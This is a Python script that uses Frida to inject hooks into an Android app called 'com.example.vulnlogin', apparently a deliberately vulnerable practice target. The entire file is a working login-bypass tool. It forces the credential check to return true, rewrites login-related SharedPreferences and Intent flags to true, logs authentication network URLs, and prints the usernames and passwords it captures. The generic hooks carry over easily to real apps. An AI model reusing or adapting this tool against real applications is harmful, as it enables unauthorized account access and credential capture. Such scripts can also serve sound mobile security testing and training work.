#!/usr/bin/env python3

import frida
import sys
import time
import json

class LoginBypassAutomator:
    def __init__(self):
        self.device = None
        self.session = None
        self.script = None
        
    def connect(self):
        """Connect to USB device"""
        try:
            self.device = frida.get_usb_device()
            print("[+] Connected to device")
            return True
        except Exception as e:
            print(f"[-] Failed to connect: {e}")
            return False
    
    def spawn_and_attach(self, package_name):
        """Spawn application and attach"""
        try:
            pid = self.device.spawn([package_name])
            self.session = self.device.attach(pid)
            self.device.resume(pid)
            print(f"[+] Spawned and attached to {package_name}")
            return True
        except Exception as e:
            print(f"[-] Failed to spawn/attach: {e}")
            return False
    
    def load_bypass_script(self):
        """Load the comprehensive bypass script"""
        js_code = """
        Java.perform(function() {
            console.log("[+] Advanced Login Bypass Loaded");
            
            // Method 1: Direct authentication bypass
            try {
                var LoginActivity = Java.use("com.example.vulnlogin.LoginActivity");
                LoginActivity.validateCredentials.implementation = function(username, password) {
                    send({"method": "direct_bypass", "username": username, "password": password});
                    return true;
                };
                console.log("[+] Direct bypass hook installed");
            } catch(e) {
                console.log("[-] Direct bypass failed: " + e);
            }
            
            // Method 2: SharedPreferences manipulation
            try {
                var SharedPreferences = Java.use("android.content.SharedPreferences");
                var Editor = Java.use("android.content.SharedPreferences$Editor");
                
                Editor.putBoolean.overload('java.lang.String', 'boolean').implementation = function(key, value) {
                    if (key.includes("login") || key.includes("auth")) {
                        send({"method": "prefs_bypass", "key": key, "original": value});
                        return this.putBoolean(key, true);
                    }
                    return this.putBoolean(key, value);
                };
                console.log("[+] SharedPreferences bypass hook installed");
            } catch(e) {
                console.log("[-] SharedPreferences bypass failed: " + e);
            }
            
            // Method 3: Network request interception
            try {
                var OkHttpClient = Java.use("okhttp3.OkHttpClient");
                var Request = Java.use("okhttp3.Request");
                var Response = Java.use("okhttp3.Response");
                var ResponseBody = Java.use("okhttp3.ResponseBody");
                var MediaType = Java.use("okhttp3.MediaType");
                
                // Hook network calls
                OkHttpClient.newCall.implementation = function(request) {
                    var url = request.url().toString();
                    if (url.includes("login") || url.includes("auth")) {
                        send({"method": "network_intercept", "url": url});
                    }
                    return this.newCall(request);
                };
                console.log("[+] Network interception hook installed");
            } catch(e) {
                console.log("[-] Network interception failed: " + e);
            }
            
            // Method 4: Intent manipulation
            try {
                var Intent = Java.use("android.content.Intent");
                Intent.putExtra.overload('java.lang.String', 'boolean').implementation = function(key, value) {
                    if (key.includes("login") || key.includes("success")) {
                        send({"method": "intent_bypass", "key": key, "original": value});
                        return this.putExtra(key, true);
                    }
                    return this.putExtra(key, value);
                };
                console.log("[+] Intent manipulation hook installed");
            } catch(e) {
                console.log("[-] Intent manipulation failed: " + e);
            }
        });
        """
        
        try:
            self.script = self.session.create_script(js_code)
            self.script.on('message', self.on_message)
            self.script.load()
            print("[+] Advanced bypass script loaded")
            return True
        except Exception as e:
            print(f"[-] Failed to load script: {e}")
            return False
    
    def on_message(self, message, data):
        """Handle messages from Frida script"""
        if message['type'] == 'send':
            payload = message['payload']
            method = payload.get('method', 'unknown')
            
            if method == 'direct_bypass':
                print(f"[+] Direct Bypass: {payload['username']}/{payload['password']}")
            elif method == 'prefs_bypass':
                print(f"[+] Preferences Bypass: {payload['key']} -> True (was {payload['original']})")
            elif method == 'network_intercept':
                print(f"[+] Network Intercept: {payload['url']}")
            elif method == 'intent_bypass':
                print(f"[+] Intent Bypass: {payload['key']} -> True (was {payload['original']})")
        elif message['type'] == 'error':
            print(f"[-] Script Error: {message['stack']}")
    
    def run(self):
        """Main execution loop"""
        if not self.connect():
            return
        
        if not self.spawn_and_attach("com.example.vulnlogin"):
            return
        
        if not self.load_bypass_script():
            return
        
        print("[+] Advanced bypass automation running...")
        print("[+] Try logging in with any credentials in the app")
        print("[+] Press Ctrl+C to stop")
        
        try:
            sys.stdin.read()
        except KeyboardInterrupt:
            print("\n[+] Stopping automation...")
        finally:
            if self.session:
                self.session.detach()

if __name__ == "__main__":
    automator = LoginBypassAutomator()
    automator.run()
